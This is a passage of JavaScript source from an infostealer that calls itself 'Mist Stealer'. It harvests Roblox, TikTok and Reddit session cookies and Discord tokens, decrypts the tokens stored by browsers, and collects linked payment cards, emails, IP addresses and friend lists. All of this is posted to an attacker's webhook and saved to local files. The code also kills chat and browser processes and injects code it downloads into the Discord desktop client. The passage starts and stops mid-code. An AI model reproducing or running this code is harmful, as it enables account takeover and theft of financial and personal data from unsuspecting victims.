      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    };

    try {
      let response = await axios.get('https://apis.roblox.com/payments-gateway/v1/payment-profiles', { headers: headers });

      return response.data;
    } catch (error) {
      console.error('Error fetching payment profiles:', error.message);
      throw error;
    }
  }

  async function FetchTotalRAP(secret_cookie) {
    let headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
      'cookie': `.ROBLOSECURITY=${secret_cookie};`,
      'origin': 'https://www.roblox.com',
      'referer': 'https://www.roblox.com',
      'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    };

    let accountResponse = await axios.get('https://www.roblox.com/my/account/json', { headers });
    let userId = accountResponse.data.UserId;

    const inventoryUrl = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`;
    let collectibles = [];
    let cursor = null;
    let totalRAP = 0;

    do {
      const urlWithCursor = cursor ? `${inventoryUrl}&cursor=${cursor}` : inventoryUrl;
      const response = await axios.get(urlWithCursor, { headers });

      if (response.data && response.data.data) {
        collectibles = collectibles.concat(response.data.data);
        cursor = response.data.nextPageCursor;

        response.data.data.forEach(item => {
          totalRAP += item.recentAveragePrice || 0;
        });
      } else {
        cursor = null;
      }

    } while (cursor);

    return totalRAP;
  }

  async function FetchPinStatus(secret_cookie) {
    let headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
      'cookie': `.ROBLOSECURITY=${secret_cookie};`,
      'origin': 'https://www.roblox.com',
      'referer': 'https://www.roblox.com',
      'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    };

    try {
      let response = await axios.get('https://auth.roblox.com/v1/account/pin', { headers });

      return response.data.isEnabled ? 'true' : 'false';

    } catch (error) {
      console.error('Error fetching Pin status:', error.message);
      throw error;
    }
  }

  async function FetchCreditBalance(secret_cookie) {
    let headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
      'cookie': `.ROBLOSECURITY=${secret_cookie};`,
      'origin': 'https://www.roblox.com',
      'referer': 'https://www.roblox.com',
      'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    };

    try {
      let response = await axios.get('https://apis.roblox.com/credit-balance/v1/get-credit-balance-for-navigation', { headers });

      return response.data.balance || 0;
    } catch (error) {
      console.error('Error fetching credit balance:', error.message);
      throw error;
    }
  }

  async function FetchPremiumStatus(secret_cookie) {
    let headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
      'cookie': `.ROBLOSECURITY=${secret_cookie};`,
      'origin': 'https://www.roblox.com',
      'referer': 'https://www.roblox.com',
      'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    };

    try {

        let accountResponse = await axios.get('https://www.roblox.com/my/account/json', { headers });
        let userId = accountResponse.data.UserId;

        let response = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers });

      return response.data.isPremium ? 'true' : 'false';

    } catch (error) {
      console.error('Error fetching Premium status:', error.message);
      return 'false';
    }
  }

async function SubmitRoblox(secret_cookie) {
    try {
        let data = await GetRobloxDataAndTransactionTotals(secret_cookie);

        if (!data || !data.username || data.robux === undefined || data.userID === undefined || data.outgoingRobux === undefined) {
            console.error('Invalid Roblox data received:', data);
            return;
        }

        const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;
        const pendingrobux = data.pendingRobuxTotal;

        let paymentProfiles = await GetPaymentProfiles(secret_cookie);
        let totalRAP = await FetchTotalRAP(secret_cookie);
        let pinStatus = await FetchPinStatus(secret_cookie);
        let creditBalance = await FetchCreditBalance(secret_cookie);
        let premiumStatus = await FetchPremiumStatus(secret_cookie, data.userID);

        let rapValue = totalRAP > 0 ? `${totalRAP} RAP` : 'No RAP';

        let embed = {
            color: 3553599,
            author: {
                name: 'Roblox Session',
                icon_url: 'https://media.discordapp.net/attachments/1305940176337502261/1306005125617287320/250.png?ex=6735178e&is=6733c60e&hm=937a198976f98f3e0f874a546f093b58473574a87e014ecbc5f7703c731f439c&=&format=webp&quality=lossless',
            },
            fields: [
                { name: '<:8:1305996567907536927> Name:', value: data.username, inline: true },
                { name: '<:8:1306006749257400330> Robux:', value: robuxValue, inline: true },
                { name: '<:82:1306007498678862008> UserID:', value: data.userID, inline: true },
                { name: '<:82:1248157588747452417> User Email:', value: data.userEmail === null ? 'Not Provided' : data.userEmail, inline: true },
                { name: '<:82:1306004206473318480> Is Email Verified:', value: data.isEmailVerified, inline: true },
                { name: '<:82:992499330508390470> Pending Robux:', value: pendingrobux, inline: true },
                { name: '<:82:1190173607884754965> Total RAP:', value: rapValue, inline: true },
                { name: '<a:82:947134506484244501> Pin Enabled:', value: pinStatus, inline: true },
                { name: '<:82:1306007503724875889> Credit Balance:', value: creditBalance.toString(), inline: true },
                { name: '<a:82:1306006750335471628> Premium:', value: premiumStatus, inline: true },
                {
                    name: 'Payment Profiles:',
                    value: paymentProfiles.map(profile => {
                        return `Card: ${profile.providerPayload.CardNetwork} Ending in ${profile.providerPayload.Last4Digits}`;
                    }).join('\n'),
                    inline: false,
                },
            ],
            footer: {
                text: 'Mist Stealer | t.me/MistStealer',
                icon_url: 'https://cdn.discordapp.com/attachments/1305940176337502261/1305958038506836059/i2OZNrgCTVihJCs1NmPQaQ.png?ex=67378eb3&is=67363d33&hm=3f7e08ca921cb1bef44b5cf2428b156805f59d1e90652a26f69e7c67cb4158dd&',
            },
        };

        let payload = {
            embeds: [embed]
        };

        axios.post(`${api_url}/webhooks/${key}`, payload)
            .then(response => {
                console.log('Discord webhook sent successfully!');
            })
            .catch(error => {
                console.error('Error sending Discord webhook:', error.message);
            });

        const dir = 'Sessions';
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir);
        }
        const filePath = path.join(dir, 'robloxsessions.txt');

        let sessionData = `
        Name: ${data.username}
        Robux: ${robuxValue}
        UserID: ${data.userID}
        User Email: ${data.userEmail === null ? 'Not Provided' : data.userEmail}
        Is Email Verified: ${data.isEmailVerified}
        Pending Robux: ${pendingrobux}
        Total RAP: ${rapValue}
        Pin Enabled: ${pinStatus}
        Credit Balance: ${creditBalance.toString()}
        Premium: ${premiumStatus}
        Payment Profiles: ${paymentProfiles.map(profile => {
            return `Card: ${profile.providerPayload.CardNetwork} Ending in ${profile.providerPayload.Last4Digits}`;
        }).join('\n')}

        Roblox Security Cookie: ${secret_cookie}
        `;

        fs.writeFileSync(filePath, sessionData, 'utf8');
        console.log('Session data written to robloxsessions.txt');

    } catch (error) {
        console.error('Error fetching Roblox data:', error.message);
    }
}


function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }


        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
                  embeds: [
                    {
                      title: "TikTok Session Detected",
                      description: "The TikTok session was detected",
                      color: 16716947,
                      fields: [
                        {
                          name: "Cookie",
                          value: "```" + cookie + "```",
                          inline: true
                        },
                        {
                          name: "Profile URL",
                          value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
                          inline: true
                        },
                        {
                          name: "User Identifier",
                          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "Email",
                          value: "```" + (accountInfo.data.email || "No Email") + "```",
                          inline: true
                        },
                        {
                          name: "Username",
                          value: "```" + accountInfo.data.username + "```",
                          inline: true
                        },
                        {
                          name: "Follower Count",
                          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "Coins",
                          value: "```" + wallet.data.coins + "```",
                          inline: true
                        }
                      ],
                      footer: {
                        text: "TikTok Session Information" // Altbilgi metni (Opsiyonel)
                      }
                    }
                  ]
                };

                  axios.post(`${api_url}/webhooks/${key}`, webhookPayload)
                    .then(response => {
                      console.log('Discord webhook sent successfully!');
                    })
              })
              .catch(error => {
                console.error('Error in retrieving wallet information:', error);
              });
          })
          .catch(error => {
            console.error('Error in retrieving insights:', error);
          });
      })
      .catch(error => {
        console.error('Error in retrieving account information:', error);
      });
  } catch (error) {
    const errorMessage = {
      title: "Error Detected",
      description: "An error occurred while trying to steal TikTok session.",
      color: 16711680,
      fields: [
        {
          name: "Error Message",
          value: "```" + error.message + "```",
          inline: false
        }
      ],
      footer: {
        text: "TikTok Session Error"
      }
    };


    axios.post(`${api_url}/error`, { embeds: [errorMessage] })
      .then(response => {
        console.log('Error message sent to Discord webhook successfully!');
      })
      .catch(err => {
        console.error('Error sending error message to Discord webhook:', err);
      });
  }
}

function setRedditSession(cookie) {
    try {
        const cookies = `reddit_session=${cookie}`;
        const headers = {
            'Cookie': cookies,
            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
        };

        const jsonData = {
            scopes: ['*', 'email', 'pii']
        };

        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';

        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    'Authorization': `Bearer ${accessToken}`
                };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;
                        const profileUrl = `https://www.reddit.com/user/${username}`;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;
                        const suspended = userData.is_suspended;

                        // Embed data for webhook
                        const embedData = {
                            title: "Mist Stealer",
                            description: "",
                            color: 0xff6f61,
                            url: '',
                            timestamp: new Date().toISOString(),
                            fields: [
                                { name: '<:cookie:1205123589930749995> Cookies', value: '```' + cookies + '```', inline: false },
                                { name: ':globe_with_meridians: Profile URL', value: '```' + profileUrl + '```', inline: false },
                                { name: ':bust_in_silhouette: Username', value: '```' + username + '```', inline: false },
                                { name: '', value: ':speech_balloon: Comments: ```' + commentKarma + '``` :thumbsup: Total Karma: ```' + totalKarma + '```', inline: true },
                                { name: ':moneybag: Coins', value: '```' + coins + '```', inline: false },
                                { name: ':shield: Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
                                { name: ':star2: Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
                                { name: ':no_entry_sign: Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                            ],
                            footer: {
                                text: 'Developed by  Mist Stealer'
                            }
                        };

                        // Send data to the webhook
                        const data = {
                            embeds: [embedData]
                        };
                        axios.post(`${api_url}/webhooks/${key}`, data)
                            .then(() => {
                                console.log('Data successfully sent to the webhook.');
                            })
                            .catch(error => {
                                console.error('Error sending data to the webhook:', error);
                            });

                        // Write session data to redditsessions.txt
                        const dir = 'Sessions';
                        if (!fs.existsSync(dir)) {
                            fs.mkdirSync(dir);
                        }
                        const filePath = path.join(dir, 'redditsessions.txt');

                        let sessionData = `
                        Cookies: ${cookies}
                        Username: ${username}
                        Profile URL: ${profileUrl}
                        Comment Karma: ${commentKarma}
                        Total Karma: ${totalKarma}
                        Coins: ${coins}
                        Moderator: ${mod ? 'Yes' : 'No'}
                        Reddit Gold: ${gold ? 'Yes' : 'No'}
                        Suspended: ${suspended ? 'Yes' : 'No'}
                        `;

                        // Write session data to file
                        fs.writeFileSync(filePath, sessionData, 'utf8');
                        console.log('Reddit session data written to redditsessions.txt');
                    })
                    .catch(error => {
                        console.error('Error retrieving user data:', error);
                    });
            })
            .catch(error => {
                console.error('Error obtaining access token:', error);
            });
    } catch (error) {
        console.error('An error occurred:', error);
    }
}


//
const decryptKey = (localState) => {
  const encryptedKey = JSON.parse(fs.readFileSync(localState, 'utf8')).os_crypt.encrypted_key;
  const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
  return Dpapi.unprotectData(Buffer.from(encrypted, 'utf8'), null, 'CurrentUser');
};

function findTokenn(path) {
        path += 'Local Storage\\leveldb';
        let tokens = [];
        try {
                fs.readdirSync(path)
                        .map(file => {
                                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                                        .split(/\r?\n/)
                                        .forEach(line => {
                                                const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                                                for (const pattern of patterns) {
                                                        const foundTokens = line.match(pattern);
                                                        if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                                                }
                                        });
                        });
        } catch (e) {}
        return tokens;
}

const tokens = [];

async function findToken(path) {
        let path_tail = path;
        path += 'Local Storage\\leveldb';

        if (!path_tail.includes('discord')) {
                try {
                        fs.readdirSync(path)
                                .map(file => {
                                        (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                                                .split(/\r?\n/)
                                                .forEach(line => {
                                                const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                                                        for (const pattern of patterns) {
                                                                const foundTokens = line.match(pattern);
                                                                if (foundTokens) foundTokens.forEach(token => {
                                                                        if (!tokens.includes(token)) tokens.push(token)
                                                                });
                                                        }
                                                });
                                });
                } catch (e) { }
                return;
        } else {
                if (fs.existsSync(path_tail + '\\Local State')) {
                        try {
         const tokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;

fs.readdirSync(path).forEach(file => {
        if (file.endsWith('.log') || file.endsWith('.ldb')) {
                const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
                const lines = fileContent.split(/\r?\n/);

                const localStatePath = path_tail+'\Local State'
                const key = decryptKey(localStatePath);

                lines.forEach(line => {
                        const foundTokens = line.match(tokenRegex);
                        if (foundTokens) {
                                foundTokens.forEach(token => {
                                        let decrypted;
                                        const encryptedValue = Buffer.from(token.split(':')[1], 'base64');
                                        const start = encryptedValue.slice(3, 15);
                                        const middle = encryptedValue.slice(15, encryptedValue.length - 16);
                                        const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                        const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                        decipher.setAuthTag(end);
                                        decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');
                                        if (!tokens.includes(decrypted)) tokens.push(decrypted)
                                });
                        }
                });
        }
});

                        } catch (e) { }
                        return;
                }
        }
}


async function stealTokens() {
        for (let path of paths) {
                await findToken(path);
        }

        for (let token of tokens) {
                try {
                        let json;
                        await axios.get("https://discord.com/api/v6/users/@me", {
                                headers: {
                                        "Content-Type": "application/json",
                                        "authorization": token
                                }
                        }).then(res => { json = res.data}).catch(() => { json = null });
                        if (!json) continue;
                        var ip = await getIp();
                        var billing = await getBilling(token);
            var friends = await getRelationships(token);

                        const randomString = crypto.randomBytes(16).toString('hex');

                                        const creationDate = new Date((json.id / 4194304) + 1420070400000).toUTCString();

                        const userInformationEmbed = {
                                color: 0x2b2d31,
                                author: {
                                        name: `${json.username} (${json.id})`,
                                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
                                },
                                thumbnail: {
                                        url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                                },
                                fields: [
                                        {
                                                name: "<:tomie:1248124966122160128> Token:",
                                                value: `\`${token}\``
                                        },
                                        {
                                                name: "<:1297068867440345109:1307462425687101440> Badges:",
                                                value: getBadges(json.flags),
                                                inline: true
                                        },
                                        {
                                                name: "<:japan:1223077879990980739> Nitro Type:",
                                                value: await getNitro(json.premium_type, json.id, token),
                                                inline: true
                                        },
                                        {
                                                name: "<a:lucky_kart:789089230457929729> Billing:",
                                                value: billing,
                                                inline: true
                                        },

                                        {
                                                name: "<:email:1306004206473318480>\n Email:",
                                                value: `\`${json.email}\``,
                                                inline: true
                                        },
                                        {
                                                name: "<a:r_wifi:1305957672989888614> IP:",
                                                value: `\`${ip}\``,
                                                inline: true
                                        },
                                        {
                                                name: "<:3503rolemanager:1062056743363952682> Account Created:",
                                                value: creationDate,
                                                inline: true
                                        },
                                ],
                                footer: {
                                        text: "@Miststealer | Mist Stealer | t.me/Miststealer",
                    icon_url: 'https://cdn.discordapp.com/attachments/1305940176337502261/1305958038506836059/i2OZNrgCTVihJCs1NmPQaQ.png?ex=6734ebb3&is=67339a33&hm=5233a4412b3efea03066631308de9ed88bf44f217f0d3a17f18ac0566bdd8ebd&'

                                }
                        };

                        const friendsEmbed = {
                                color: 0x2b2d31,
                                description: friends,
                                author: {
                                        name: `HQ Friends`,
                                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                                },

                                footer: {
                                        text: "@Miststealer | Mist Stealer | t.me/Miststealer"
                                }
                        };

                        const data = {
                                embeds: [userInformationEmbed, friendsEmbed]
                        }

            axios.post(`${api_url}/webhooks/${key}`, data);
                } catch (error) {
                        console.error(error);

                }
        }
}


const badges = {
        Discord_Employee: {
                Value: 1,
                Emoji: "<:staff:874750808728666152>",
                Rare: true,
        },
        Partnered_Server_Owner: {
                Value: 2,
                Emoji: "<:partner:874750808678354964>",
                Rare: true,
        },
        HypeSquad_Events: {
                Value: 4,
                Emoji: "<:hypesquad_events:874750808594477056>",
                Rare: true,
        },
        Bug_Hunter_Level_1: {
                Value: 8,
                Emoji: "<:bughunter_1:874750808426692658>",
                Rare: true,
        },
        Early_Supporter: {
                Value: 512,
                Emoji: "<:early_supporter:874750808414113823>",
                Rare: true,
        },
        Bug_Hunter_Level_2: {
                Value: 16384,
                Emoji: "<:bughunter_2:874750808430874664>",
                Rare: true,
        },
        Early_Verified_Bot_Developer: {
                Value: 131072,
                Emoji: "<:developer:874750808472825986>",
                Rare: true,
        },
        House_Bravery: {
                Value: 64,
                Emoji: "<:bravery:874750808388952075>",
                Rare: false,
        },
        House_Brilliance: {
                Value: 128,
                Emoji: "<:brilliance:874750808338608199>",
                Rare: false,
        },
        House_Balance: {
                Value: 256,
                Emoji: "<:balance:874750808267292683>",
                Rare: false,
        },
        Discord_Official_Moderator: {
                Value: 262144,
                Emoji: "<:moderator:857241458889195571>",
                Rare: true,
        }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBoostEmblem(id, token) {
    try {
        let info;
        await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { info = res.data })
            .catch(() => { })
        if (!info) return "";

        if (!info.premium_guild_since) return "";

        let boost = ["<:lvl1:1219031125247266887>", "<:lvl2:1219031171942449282>", "<:lvl3:1219031999847858216>", "<:lvl4:1219031250950684763>", "<:lvl5:1219031294176919603>", "<:lvl6:1219031344324022425>", "<:lvl7:1219031400607645816>", "<:lvl8:1219031431280332910>", "<:lvl9:1219031069974724638>"]
        var i = 0

        let boostPeriods = [2, 3, 6, 9, 12, 15, 18, 24];
        for (const period of boostPeriods) {
            let expiryDate = new Date(info.premium_guild_since);
            expiryDate.setMonth(expiryDate.getMonth() + period);
            let daysLeft = Math.round((expiryDate - Date.now()) / 86400000);
            if (daysLeft > 0) {
                break;
            } else {
                i++;
            }
        }

        if (i >= 4) {
            return `<:nitro:1227750272915345589>${boost[i]}`;
        } else {
            return "";
        }
    } catch {
        return "";
    }
}

async function getBilling(token) {
        let json;
        await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
                headers: {
                        "Content-Type": "application/json",
                        "authorization": token
                }
        }).then(res => { json = res.data })
                .catch(err => { })
        if (!json) return '\`Unknown\`';

        var bi = '';
        json.forEach(z => {
                if (z.type == 2 && z.invalid != !0) {
                        bi += "<:946246524504002610:962747802830655498>";
                } else if (z.type == 1 && z.invalid != !0) {
                        bi += "<:rustler:987692721613459517>";
                }
        });
        if (bi == '') bi = `\`No Billing\``
        return bi;
}

function getBadges(flags) {
        var b = '';
        for (const prop in badges) {
                let o = badges[prop];
                if ((flags & o.Value) == o.Value) b += o.Emoji;
        };
        if (b == '') return `\`No Badges\``;
        return `${b}`;
}

function getRareBadges(flags) {
        var b = '';
        for (const prop in badges) {
                let o = badges[prop];
                if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
        };
        return b;
}

async function getNitro(flags, id, token) {
        switch (flags) {
                case 1:
                        return "<:946246402105819216:962747802797113365>";
                case 2:
                        let info;
                        await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                                headers: {
                                        "Content-Type": "application/json",
                                        "authorization": token
                                }
                        }).then(res => { info = res.data })
                                .catch(() => { })
                        if (!info) return "<:946246402105819216:962747802797113365>";

                        if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

                        let boost = ["<:lvl1:1219031125247266887>", "<:lvl2:1219031171942449282>", "<:lvl3:1219031999847858216>", "<:lvl4:1219031250950684763>", "<:lvl5:1219031294176919603>", "<:lvl6:1219031344324022425>", "<:lvl7:1219031400607645816>", "<:lvl8:1219031431280332910>", "<:lvl9:1219031069974724638>"]
                        var i = 0

                        try {
                                let d = new Date(info.premium_guild_since)
                                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                                let d1 = new Date(info.premium_guild_since)
                                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                                let d2 = new Date(info.premium_guild_since)
                                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                                let d3 = new Date(info.premium_guild_since)
                                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                                let d4 = new Date(info.premium_guild_since)
                                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                                let d5 = new Date(info.premium_guild_since)
                                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                                let d6 = new Date(info.premium_guild_since)
                                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                                let d7 = new Date(info.premium_guild_since)
                                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                                if (boost2month > 0) {
                                        i += 0
                                } else {
                                        i += 1
                                } if (boost3month > 0) {
                                        i += 0
                                } else {
                                        i += 1
                                } if (boost6month > 0) {
                                        i += 0
                                } else {
                                        i += 1
                                } if (boost9month > 0) {
                                        i += 0
                                } else {
                                        i += 1
                                } if (boost12month > 0) {
                                        i += 0
                                } else {
                                        i += 1
                                } if (boost15month > 0) {
                                        i += 0
                                } else {
                                        i += 1
                                } if (boost18month > 0) {
                                        i += 0
                                } else {
                                        i += 1
                                } if (boost24month > 0) {
                                        i += 0
                                } else if (boost24month < 0 || boost24month == 0) {
                                        i += 1
                                } else {
                                        i = 0
                                }
                        } catch {
                                i += 0
                        }
                        return `<:946246402105819216:962747802797113365> ${boost[i]}`
                default:
                        return "\`No Nitro\`";
        };
}

async function getIp() {
        var ip = await axios.get("https://www.myexternalip.com/raw")
        return ip.data;
}


async function StopCords() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'Telegram.exe', 'chrome.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}

async function InfectDiscords() {
    var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(betterdiscord)) {
        var read = fs.readFileSync(dir);
        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "Mist Stealer"))
    }
    await axios(`${api_url}/inject`).then((code => code.data)).then((res => {
        res = res.replace("%API_AUTH_HERE%", key), injection = res
    })).catch(), await fs.readdir(local, (async (err, files) => {
        await files.forEach((async dirName => {
            dirName.toString().includes("cord") && await discords.push(dirName)
        })), discords.forEach((async discordPath => {
            await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                file.forEach((async insideDiscordDir => {
                    insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                        file.forEach((async insideAppDir => {
                            insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                file.forEach((insideModulesDir => {
                                    insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                        file.forEach((insideCore => {
